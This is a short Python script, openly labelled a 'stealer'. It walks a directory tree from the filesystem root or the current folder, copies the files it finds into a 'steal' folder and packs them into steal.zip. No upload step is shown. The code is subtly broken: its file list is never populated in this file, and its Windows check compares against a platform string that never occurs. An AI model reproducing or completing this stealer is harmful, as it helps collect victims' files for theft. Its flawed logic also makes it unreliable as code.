#Author: SergioZ3R0
#region Imports
import os
import sys
import zipfile
import shutil
from darthvader import recorrer_arbol_directorios
#endregion
#region Definitions
files = [] # List to store the files in the current directory
def comprimir_archivos(nombre_archivo_zip, archivos_a_comprimir):
    with zipfile.ZipFile(nombre_archivo_zip, 'w') as archivo_zip:
        for archivo in archivos_a_comprimir:
            archivo_zip.write(archivo)

def stealer(files):
    if os.path.exists("steal"):
        pass
    else:
        os.mkdir("steal")
    for file in files:
        shutil.copy(file, "steal/")
        if file == files[-1]:
            comprimir_archivos("./steal.zip", files)
#endregion
if sys.platform == "windows":
    recorrer_arbol_directorios("\\")
else:
    recorrer_arbol_directorios("./")
stealer(files)

